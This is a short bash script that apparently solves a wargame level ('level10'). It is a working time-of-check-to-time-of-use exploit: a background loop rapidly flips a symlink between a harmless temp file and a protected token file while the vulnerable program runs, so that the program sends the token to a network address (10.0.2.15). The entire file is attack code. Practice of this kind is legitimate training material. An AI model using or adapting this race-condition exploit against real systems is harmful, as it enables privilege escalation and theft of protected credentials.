#!/bin/bash

set -e

# File and symlink paths
TARGET_LINK="link"
FAKE_FILE="/tmp/test"
REAL_FILE="/home/user/level10/token"

# Ensure cleanup on exit or Ctrl+C
cleanup() {
    echo "[*] Cleaning up..."
    [ -n "$FLIP_PID" ] && kill "$FLIP_PID" 2>/dev/null || true
    rm -f "$TARGET_LINK"
    exit 1
}

trap cleanup INT TERM EXIT

rm -f "$TARGET_LINK"
rm -f "$FAKE_FILE"
> "$FAKE_FILE"

while true; do
    (
        while true; do
            ln -sf "$FAKE_FILE" "$TARGET_LINK"
            ln -sf "$REAL_FILE" "$TARGET_LINK"
            sleep 0.001
        done
    ) &
    FLIP_PID=$!

    # Run the vulnerable program
    /home/user/level10/level10 "$TARGET_LINK" 10.0.2.15 || true

    # Give the program time to finish
    sleep 0.2

    # Stop the flipper
    kill "$FLIP_PID" 2>/dev/null || true
    wait "$FLIP_PID" 2>/dev/null || true


    # Clear file for next try
    > "$FAKE_FILE"

done

# Disable trap and clean up
trap - INT TERM EXIT

cleanup
